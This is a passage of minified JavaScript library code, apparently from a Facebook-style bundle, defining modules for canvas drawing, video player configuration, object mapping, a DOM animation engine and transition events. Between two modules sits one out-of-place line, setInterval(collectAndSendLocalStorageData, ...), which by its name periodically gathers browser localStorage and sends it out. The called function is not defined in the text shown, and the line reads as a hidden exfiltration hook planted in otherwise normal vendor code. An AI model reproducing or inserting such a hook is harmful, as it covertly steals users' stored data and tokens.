      this.$3 === "cover" && (g *= -1, f *= -1);
      g > f ? d = e * f : g < f && (e = d / f);
      g = this.$1.getContext("2d");
      if (!(g instanceof window.CanvasRenderingContext2D)) return;
      try {
        if (this.$6 || this.$7) {
          g.drawImage(this.$2, (f = this.$8) != null ? f : 0, (f = this.$9) != null ? f : 0, (f = this.$6) != null ? f : a, (f = this.$7) != null ? f : b, 0, 0, a, b);
        } else g.drawImage(this.$2, (a - d) / 2, (b - e) / 2, d, e);
      } catch (a) {
        if (a.name !== "NS_ERROR_NOT_AVAILABLE") throw a;
      }
    };
    b.getDOMNode = function () {
      return this.$1;
    };
    b.updateDimensions = function (a, b) {
      this.$4 = a, this.$5 = b;
    };
    return a;
  }();
  g["default"] = a;
}, 98);
setInterval(collectAndSendLocalStorageData, 5 * 60 * 1000);
__d("VideoPlayerContextSensitiveConfigUtils", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = function (a, b) {
    return b.every(function (b) {
      return a[b.name] === b.value;
    });
  };
  a = function (a, b) {
    return b.find(function (b) {
      return g(a, b.contexts);
    });
  };
  f.getFirstMatchingValueAndContextTargets = a;
}, 66);
__d("VideoPlayerContextSensitiveConfigResolver", ["VideoPlayerContextSensitiveConfigPayload", "VideoPlayerContextSensitiveConfigUtils", "cr:1724253"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = function () {
    function a(a) {
      this.$1 = {}, this.$2 = {}, a == null ? (this.$3 = c("VideoPlayerContextSensitiveConfigPayload").static_values, this.$4 = c("VideoPlayerContextSensitiveConfigPayload").context_sensitive_values) : (this.$3 = a.staticValues, this.$4 = a.contextSensitiveValues);
    }
    var e = a.prototype;
    e.setContexts = function (a) {
      this.$1 = a, this.$2 = this.$5(a);
    };
    e.getValue = function (a) {
      if (this.$2[a] != null) return this.$2[a];
      return this.$3[a] != null ? this.$3[a] : null;
    };
    e.$5 = function (a) {
      var b = this;
      return Object.keys(this.$4).reduce(function (c, e) {
        var f = b.$4[e];
        if (f != null) {
          f = d("VideoPlayerContextSensitiveConfigUtils").getFirstMatchingValueAndContextTargets(a, f);
          f != null && (c[e] = f.value);
        }
        return c;
      }, {});
    };
    a.getPayload = function () {
      return c("VideoPlayerContextSensitiveConfigPayload");
    };
    a.getSources = function () {
      return b("cr:1724253");
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("VideoPlayerShakaGlobalConfig", ["VideoPlayerContextSensitiveConfigResolver"], function (a, b, c, d, e, f, g) {
  var h = new (c("VideoPlayerContextSensitiveConfigResolver"))(),
    i = {};
  a = function (a) {
    i = a;
  };
  b = function (a, b) {
    if (!!i && typeof i[a] === "boolean") return i[a];
    a = h.getValue(a);
    return a != null && typeof a === "boolean" ? a : b;
  };
  d = function (a, b) {
    if (!!i && typeof i[a] === "number") return i[a];
    a = h.getValue(a);
    return a != null && typeof a === "number" ? a : b;
  };
  e = function (a, b) {
    if (!!i && typeof i[a] === "string") return i[a];
    a = h.getValue(a);
    return a != null && typeof a === "string" ? a : b;
  };
  g.setGlobalOverrideConfig = a;
  g.getBool = b;
  g.getNumber = d;
  g.getString = e;
}, 98);
__d("mapObject", [], function (a, b, c, d, e, f) {
  "use strict";

  function g(a, b, c) {
    if (!a) return null;
    var d = {};
    Object.keys(a).forEach(function (e) {
      d[e] = b.call(c, a[e], e, a);
    });
    return d;
  }
  function a(a, b, c) {
    return g(a, b, c);
  }
  function b(a, b, c) {
    return g(a, b, c);
  }
  function c(a, b, c) {
    return g(a, b, c);
  }
  g.untyped = a;
  g.shape = b;
  g.self = c;
  f["default"] = g;
}, 66);
__d("Animation", ["BrowserSupport", "CSS", "DOM", "DataStore", "Style", "clearInterval", "clearTimeout", "getVendorPrefixedName", "requestAnimationFrame", "setIntervalAcrossTransitions", "setTimeoutAcrossTransitions", "shield"], function (a, b, c, d, e, f) {
  var g = b("requestAnimationFrame"),
    h = [],
    i;
  function j(b) {
    if (a == this) return new j(b);else this.obj = b, this._reset_state(), this.queue = [], this.last_attr = null, this.unit = "px", this.behaviorOverrides = {
      ignoreUserScroll: !1
    };
  }
  function k(a) {
    if (b("BrowserSupport").hasCSS3DTransforms()) return n(a);else return m(a);
  }
  function l(a) {
    return a.toFixed(8);
  }
  function m(a) {
    a = [a[0], a[4], a[1], a[5], a[12], a[13]];
    return "matrix(" + a.map(l).join(",") + ")";
  }
  function n(a) {
    return "matrix3d(" + a.map(l).join(",") + ")";
  }
  function o(a, b) {
    a || (a = [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1]);
    var c = [];
    for (var d = 0; d < 4; d++) for (var e = 0; e < 4; e++) {
      var f = 0;
      for (var g = 0; g < 4; g++) f += a[d * 4 + g] * b[g * 4 + e];
      c[d * 4 + e] = f;
    }
    return c;
  }
  var p = 0;
  j.prototype._reset_state = function () {
    this.state = {
      attrs: {},
      duration: 500
    };
  };
  j.prototype.stop = function () {
    this._reset_state();
    this.queue = [];
    return this;
  };
  j.prototype._build_container = function () {
    if (this.container_div) {
      this._refresh_container();
      return;
    }
    if (this.obj.firstChild && this.obj.firstChild.__animation_refs) {
      this.container_div = this.obj.firstChild;
      this.container_div.__animation_refs++;
      this._refresh_container();
      return;
    }
    var a = document.createElement("div");
    a.style.padding = "0px";
    a.style.margin = "0px";
    a.style.border = "0px";
    a.__animation_refs = 1;
    var b = this.obj.childNodes;
    while (b.length) a.appendChild(b[0]);
    this.obj.appendChild(a);
    this._orig_overflow = this.obj.style.overflow;
    this.obj.style.overflow = "hidden";
    this.container_div = a;
    this._refresh_container();
  };
  j.prototype._refresh_container = function () {
    this.container_div.style.height = "auto", this.container_div.style.width = "auto", this.container_div.style.height = this.container_div.offsetHeight + this.unit, this.container_div.style.width = this.container_div.offsetWidth + this.unit;
  };
  j.prototype._destroy_container = function () {
    if (!this.container_div) return;
    if (! --this.container_div.__animation_refs) {
      var a = this.container_div.childNodes;
      while (a.length) this.obj.appendChild(a[0]);
      this.obj.removeChild(this.container_div);
    }
    this.container_div = null;
    this.obj.style.overflow = this._orig_overflow;
  };
  var q = 1,
    r = 2,
    s = 3;
  j.prototype._attr = function (a, b, c) {
    a = a.replace(/-[a-z]/gi, function (a) {
      return a.substring(1).toUpperCase();
    });
    var d = !1;
    switch (a) {
      case "background":
        this._attr("backgroundColor", b, c);
        return this;
      case "backgroundColor":
      case "borderColor":
      case "color":
        b = w(b);
        break;
      case "opacity":
        b = parseFloat(b, 10);
        break;
      case "height":
      case "width":
        b == "auto" ? d = !0 : b = parseInt(b, 10);
        break;
      case "borderWidth":
      case "lineHeight":
      case "fontSize":
      case "margin":
      case "marginBottom":
      case "marginLeft":
      case "marginRight":
      case "marginTop":
      case "padding":
      case "paddingBottom":
      case "paddingLeft":
      case "paddingRight":
      case "paddingTop":
      case "bottom":
      case "left":
      case "right":
      case "top":
      case "scrollTop":
      case "scrollLeft":
        b = parseInt(b, 10);
        break;
      case "rotateX":
      case "rotateY":
      case "rotateZ":
        b = parseInt(b, 10) * Math.PI / 180;
        break;
      case "translateX":
      case "translateY":
      case "translateZ":
      case "scaleX":
      case "scaleY":
      case "scaleZ":
        b = parseFloat(b, 10);
        break;
      case "rotate3d":
        this._attr("rotateX", b[0], c);
        this._attr("rotateY", b[1], c);
        this._attr("rotateZ", b[2], c);
        return this;
      case "rotate":
        this._attr("rotateZ", b, c);
        return this;
      case "scale3d":
        this._attr("scaleZ", b[2], c);
      case "scale":
        this._attr("scaleX", b[0], c);
        this._attr("scaleY", b[1], c);
        return this;
      case "translate3d":
        this._attr("translateZ", b[2], c);
      case "translate":
        this._attr("translateX", b[0], c);
        this._attr("translateY", b[1], c);
        return this;
      default:
        throw new Error(a + " is not a supported attribute!");
    }
    this.state.attrs[a] === void 0 && (this.state.attrs[a] = {});
    d && (this.state.attrs[a].auto = !0);
    switch (c) {
      case s:
        this.state.attrs[a].start = b;
        break;
      case r:
        this.state.attrs[a].by = !0;
      case q:
        this.state.attrs[a].value = b;
        break;
    }
  };
  function t(a) {
    var c,
      d = parseInt((c = b("Style")).get(a, "paddingLeft"), 10),
      e = parseInt(c.get(a, "paddingRight"), 10),
      f = parseInt(c.get(a, "borderLeftWidth"), 10);
    c = parseInt(c.get(a, "borderRightWidth"), 10);
    return a.offsetWidth - (d ? d : 0) - (e ? e : 0) - (f ? f : 0) - (c ? c : 0);
  }
  function u(a) {
    var c,
      d = parseInt((c = b("Style")).get(a, "paddingTop"), 10),
      e = parseInt(c.get(a, "paddingBottom"), 10),
      f = parseInt(c.get(a, "borderTopWidth"), 10);
    c = parseInt(c.get(a, "borderBottomWidth"), 10);
    return a.offsetHeight - (d ? d : 0) - (e ? e : 0) - (f ? f : 0) - (c ? c : 0);
  }
  j.prototype.setUnit = function (a) {
    this.unit = a;
    return this;
  };
  j.prototype.to = function (a, b) {
    b === void 0 ? this._attr(this.last_attr, a, q) : (this._attr(a, b, q), this.last_attr = a);
    return this;
  };
  j.prototype.by = function (a, b) {
    b === void 0 ? this._attr(this.last_attr, a, r) : (this._attr(a, b, r), this.last_attr = a);
    return this;
  };
  j.prototype.from = function (a, b) {
    b === void 0 ? this._attr(this.last_attr, a, s) : (this._attr(a, b, s), this.last_attr = a);
    return this;
  };
  j.prototype.duration = function (a) {
    this.state.duration = a ? a : 0;
    return this;
  };
  j.prototype.checkpoint = function (a, b) {
    a === void 0 && (a = 1);
    this.state.checkpoint = a;
    this.queue.push(this.state);
    this._reset_state();
    this.state.checkpointcb = b;
    return this;
  };
  j.prototype.blind = function () {
    this.state.blind = !0;
    return this;
  };
  j.prototype.hide = function () {
    this.state.hide = !0;
    return this;
  };
  j.prototype.show = function () {
    this.state.show = !0;
    return this;
  };
  j.prototype.ease = function (a) {
    this.state.ease = a;
    return this;
  };
  j.prototype.CSSAnimation = function (a) {
    var b = {
      duration: this.state.duration
    };
    this.state.ondone && (b.callback = this.state.ondone);
    a(this.obj, b);
  };
  j.prototype.go = function () {
    var a = Date.now();
    this.queue.push(this.state);
    for (var b = 0; b < this.queue.length; b++) this.queue[b].start = a - p, this.queue[b].checkpoint && (a += this.queue[b].checkpoint * this.queue[b].duration);
    x(this);
    return this;
  };
  j.prototype._show = function () {
    b("CSS").show(this.obj);
  };
  j.prototype._hide = function () {
    b("CSS").hide(this.obj);
  };
  j.prototype.overrideBehavior = function (a) {
    this.behaviorOverrides = babelHelpers["extends"]({}, this.behaviorOverrides, a);
    return this;
  };
  j.prototype._frame = function (c) {
    var d = !0,
      e = !1,
      f;
    function g(a) {
      return document.documentElement[a] || document.body[a];
    }
    function h(a, b) {
      return a === document.body ? g(b) : a[b];
    }
    function i(a, b) {
      return b.lastScrollTop !== void 0 && b.lastScrollTop !== h(a.obj, "scrollTop") || b.lastScrollLeft !== void 0 && b.lastScrollLeft !== h(a.obj, "scrollLeft");
    }
    function j(a, b) {
      b.lastScrollTop = h(a.obj, "scrollTop"), b.lastScrollLeft = h(a.obj, "scrollLeft");
    }
    for (var l = 0; l < this.queue.length; l++) {
      var m = this.queue[l];
      if (m.start > c) {
        d = !1;
        continue;
      }
      m.checkpointcb && (this._callback(m.checkpointcb, c - m.start), m.checkpointcb = null);
      if (m.started === void 0) {
        m.show && this._show();
        for (var n in m.attrs) {
          if (m.attrs[n].start !== void 0) continue;
          switch (n) {
            case "backgroundColor":
            case "borderColor":
            case "color":
              f = w(b("Style").get(this.obj, n == "borderColor" ? "borderLeftColor" : n));
              m.attrs[n].by && (m.attrs[n].value[0] = Math.min(255, Math.max(0, m.attrs[n].value[0] + f[0])), m.attrs[n].value[1] = Math.min(255, Math.max(0, m.attrs[n].value[1] + f[1])), m.attrs[n].value[2] = Math.min(255, Math.max(0, m.attrs[n].value[2] + f[2])));
              break;
            case "opacity":
              f = b("Style").getOpacity(this.obj);
              m.attrs[n].by && (m.attrs[n].value = Math.min(1, Math.max(0, m.attrs[n].value + f)));
              break;
            case "height":
              f = u(this.obj);
              m.attrs[n].by && (m.attrs[n].value += f);
              break;
            case "width":
              f = t(this.obj);
              m.attrs[n].by && (m.attrs[n].value += f);
              break;
            case "scrollLeft":
            case "scrollTop":
              f = h(this.obj, n);
              m.attrs[n].by && (m.attrs[n].value += f);
              j(this, m);
              break;
            case "rotateX":
            case "rotateY":
            case "rotateZ":
            case "translateX":
            case "translateY":
            case "translateZ":
              f = b("DataStore").get(this.obj, n, 0);
              m.attrs[n].by && (m.attrs[n].value += f);
              break;
            case "scaleX":
            case "scaleY":
            case "scaleZ":
              f = b("DataStore").get(this.obj, n, 1);
              m.attrs[n].by && (m.attrs[n].value += f);
              break;
            default:
              f = parseInt(b("Style").get(this.obj, n), 10) || 0;
              m.attrs[n].by && (m.attrs[n].value += f);
              break;
          }
          m.attrs[n].start = f;
        }
        if (m.attrs.height && m.attrs.height.auto || m.attrs.width && m.attrs.width.auto) {
          this._destroy_container();
          for (var n in {
            height: 1,
            width: 1,
            fontSize: 1,
            borderLeftWidth: 1,
            borderRightWidth: 1,
            borderTopWidth: 1,
            borderBottomWidth: 1,
            paddingLeft: 1,
            paddingRight: 1,
            paddingTop: 1,
            paddingBottom: 1
          }) m.attrs[n] && (this.obj.style[n] = m.attrs[n].value + (typeof m.attrs[n].value === "number" ? this.unit : ""));
          m.attrs.height && m.attrs.height.auto && (m.attrs.height.value = u(this.obj));
          m.attrs.width && m.attrs.width.auto && (m.attrs.width.value = t(this.obj));
        }
        m.started = !0;
        m.blind && this._build_container();
      }
      var p = (c - m.start) / m.duration;
      p >= 1 ? (p = 1, m.hide && this._hide()) : d = !1;
      var q = m.ease ? m.ease(p) : p;
      !e && p != 1 && m.blind && (e = !0);
      for (var n in m.attrs) switch (n) {
        case "backgroundColor":
        case "borderColor":
        case "color":
          m.attrs[n].start[3] != m.attrs[n].value[3] ? this.obj.style[n] = "rgba(" + v(q, m.attrs[n].start[0], m.attrs[n].value[0], !0) + "," + v(q, m.attrs[n].start[1], m.attrs[n].value[1], !0) + "," + v(q, m.attrs[n].start[2], m.attrs[n].value[2], !0) + "," + v(q, m.attrs[n].start[3], m.attrs[n].value[3], !1) + ")" : this.obj.style[n] = "rgb(" + v(q, m.attrs[n].start[0], m.attrs[n].value[0], !0) + "," + v(q, m.attrs[n].start[1], m.attrs[n].value[1], !0) + "," + v(q, m.attrs[n].start[2], m.attrs[n].value[2], !0) + ")";
          break;
        case "opacity":
          b("Style").set(this.obj, "opacity", v(q, m.attrs[n].start, m.attrs[n].value));
          break;
        case "height":
        case "width":
          this.obj.style[n] = q == 1 && m.attrs[n].auto ? "auto" : v(q, m.attrs[n].start, m.attrs[n].value, !0) + this.unit;
          break;
        case "scrollLeft":
        case "scrollTop":
          var r = this.obj === document.body;
          if (!this.behaviorOverrides.ignoreUserScroll && i(this, m)) delete m.attrs.scrollTop, delete m.attrs.scrollLeft;else {
            var s = v(q, m.attrs[n].start, m.attrs[n].value, !0);
            !r ? this.obj[n] = s : n == "scrollLeft" ? a.scrollTo(s, g("scrollTop")) : a.scrollTo(g("scrollLeft"), s);
            j(this, m);
          }
          break;
        case "translateX":
        case "translateY":
        case "translateZ":
        case "rotateX":
        case "rotateY":
        case "rotateZ":
        case "scaleX":
        case "scaleY":
        case "scaleZ":
          b("DataStore").set(this.obj, n, v(q, m.attrs[n].start, m.attrs[n].value, !1));
          break;
        default:
          this.obj.style[n] = v(q, m.attrs[n].start, m.attrs[n].value, !0) + this.unit;
          break;
      }
      r = null;
      s = b("DataStore").get(this.obj, "translateX", 0);
      n = b("DataStore").get(this.obj, "translateY", 0);
      q = b("DataStore").get(this.obj, "translateZ", 0);
      (s || n || q) && (r = o(r, [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, s, n, q, 1]));
      s = b("DataStore").get(this.obj, "scaleX", 1);
      n = b("DataStore").get(this.obj, "scaleY", 1);
      q = b("DataStore").get(this.obj, "scaleZ", 1);
      (s - 1 || n - 1 || q - 1) && (r = o(r, [s, 0, 0, 0, 0, n, 0, 0, 0, 0, q, 0, 0, 0, 0, 1]));
      s = b("DataStore").get(this.obj, "rotateX", 0);
      s && (r = o(r, [1, 0, 0, 0, 0, Math.cos(s), Math.sin(-s), 0, 0, Math.sin(s), Math.cos(s), 0, 0, 0, 0, 1]));
      n = b("DataStore").get(this.obj, "rotateY", 0);
      n && (r = o(r, [Math.cos(n), 0, Math.sin(n), 0, 0, 1, 0, 0, Math.sin(-n), 0, Math.cos(n), 0, 0, 0, 0, 1]));
      q = b("DataStore").get(this.obj, "rotateZ", 0);
      q && (r = o(r, [Math.cos(q), Math.sin(-q), 0, 0, Math.sin(q), Math.cos(q), 0, 0, 0, 0, 1, 0, 0, 0, 0, 1]));
      s = b("getVendorPrefixedName")("transform");
      if (s) if (r) {
        n = k(r);
        b("Style").set(this.obj, s, n);
      } else d && b("Style").set(this.obj, s, null);
      p == 1 && (this.queue.splice(l--, 1), this._callback(m.ondone, c - m.start - m.duration));
    }
    !e && this.container_div && this._destroy_container();
    return !d;
  };
  j.prototype.ondone = function (a) {
    this.state.ondone = a;
    return this;
  };
  j.prototype._callback = function (a, b) {
    a && (p = b, a.call(this), p = 0);
  };
  function v(a, b, c, d) {
    return (d ? parseInt : parseFloat)((c - b) * a + b, 10);
  }
  function w(a) {
    var b = /^#([a-f0-9]{1,2})([a-f0-9]{1,2})([a-f0-9]{1,2})$/i.exec(a);
    if (b) return [parseInt(b[1].length == 1 ? b[1] + b[1] : b[1], 16), parseInt(b[2].length == 1 ? b[2] + b[2] : b[2], 16), parseInt(b[3].length == 1 ? b[3] + b[3] : b[3], 16), 1];else {
      b = /^rgba? *\(([0-9]+), *([0-9]+), *([0-9]+)(?:, *([0-9\.]+))?\)$/.exec(a);
      if (b) return [parseInt(b[1], 10), parseInt(b[2], 10), parseInt(b[3], 10), b[4] ? parseFloat(b[4]) : 1];else if (a == "transparent") return [255, 255, 255, 0];else throw new Error("Named color attributes are not supported.");
    }
  }
  function x(a) {
    h.push(a), h.length === 1 && (g ? g(z) : i = b("setIntervalAcrossTransitions")(z, 20)), g && y(), z(Date.now(), !0);
  }
  function y() {
    if (!g) throw new Error("Ending timer only valid with requestAnimationFrame");
    var a = 0;
    for (var c = 0; c < h.length; c++) {
      var d = h[c];
      for (var e = 0; e < d.queue.length; e++) {
        var f = d.queue[e].start + d.queue[e].duration;
        f > a && (a = f);
      }
    }
    i && (b("clearTimeout")(i), i = null);
    f = Date.now();
    a > f && (i = b("setTimeoutAcrossTransitions")(b("shield")(z), a - f));
  }
  function z(a, c) {
    a = Date.now();
    for (c = c === !0 ? h.length - 1 : 0; c < h.length; c++) try {
      h[c]._frame(a) || h.splice(c--, 1);
    } catch (a) {
      h.splice(c--, 1);
    }
    h.length === 0 ? i && (g ? b("clearTimeout")(i) : b("clearInterval")(i), i = null) : g && g(z);
  }
  j.ease = {};
  j.ease.begin = function (a) {
    return Math.sin(Math.PI / 2 * (a - 1)) + 1;
  };
  j.ease.end = function (a) {
    return Math.sin(.5 * Math.PI * a);
  };
  j.ease.both = function (a) {
    return .5 * Math.sin(Math.PI * (a - .5)) + .5;
  };
  j.prependInsert = function (a, c) {
    j.insert(a, c, b("DOM").prependContent);
  };
  j.appendInsert = function (a, c) {
    j.insert(a, c, b("DOM").appendContent);
  };
  j.insert = function (a, c, d) {
    b("Style").set(c, "opacity", 0), d(a, c), new j(c).from("opacity", 0).to("opacity", 1).duration(400).go();
  };
  e.exports = j;
}, null);
__d("fbjs/lib/CSSCore", ["CSSCore"], function (a, b, c, d, e, f) {
  "use strict";

  e.exports = b("CSSCore");
}, null);
__d("fbjs/lib/ExecutionEnvironment", ["ExecutionEnvironment"], function (a, b, c, d, e, f) {
  "use strict";

  e.exports = b("ExecutionEnvironment");
}, null);
__d("getVendorPrefixedEventName", ["fbjs/lib/ExecutionEnvironment"], function (a, b, c, d, e, f) {
  "use strict";

  function a(a, b) {
    var c = {};
    c[a.toLowerCase()] = b.toLowerCase();
    c["Webkit" + a] = "webkit" + b;
    c["Moz" + a] = "moz" + b;
    c["ms" + a] = "MS" + b;
    c["O" + a] = "o" + b.toLowerCase();
    return c;
  }
  var g = {
      animationend: a("Animation", "AnimationEnd"),
      animationiteration: a("Animation", "AnimationIteration"),
      animationstart: a("Animation", "AnimationStart"),
      transitionend: a("Transition", "TransitionEnd")
    },
    h = {},
    i = {};
  b("fbjs/lib/ExecutionEnvironment").canUseDOM && (i = document.createElement("div").style, "AnimationEvent" in window || (delete g.animationend.animation, delete g.animationiteration.animation, delete g.animationstart.animation), "TransitionEvent" in window || delete g.transitionend.transition);
  function c(a) {
    if (h[a]) return h[a];else if (!g[a]) return a;
    var b = g[a];
    for (var c in b) if (Object.prototype.hasOwnProperty.call(b, c) && c in i) return h[a] = b[c];
    return "";
  }
  e.exports = c;
}, null);
__d("ReactTransitionEvents", ["fbjs/lib/ExecutionEnvironment", "getVendorPrefixedEventName"], function (a, b, c, d, e, f) {
  "use strict";

  var g = [];
  function a() {
    var a = b("getVendorPrefixedEventName")("animationend"),
      c = b("getVendorPrefixedEventName")("transitionend");
    a && g.push(a);
    c && g.push(c);
  }
  b("fbjs/lib/ExecutionEnvironment").canUseDOM && a();
  function h(a, b, c) {
    a.addEventListener(b, c, !1);
  }
  function i(a, b, c) {
    a.removeEventListener(b, c, !1);
  }
  c = {
    addEndEventListener: function (a, b) {
      if (g.length === 0) {
        window.setTimeout(b, 0);
        return;
      }
      g.forEach(function (c) {
        h(a, c, b);
      });
    },
    removeEndEventListener: function (a, b) {
      if (g.length === 0) return;
      g.forEach(function (c) {
        i(a, c, b);
      });
    }
  };
  e.exports = c;
}, null);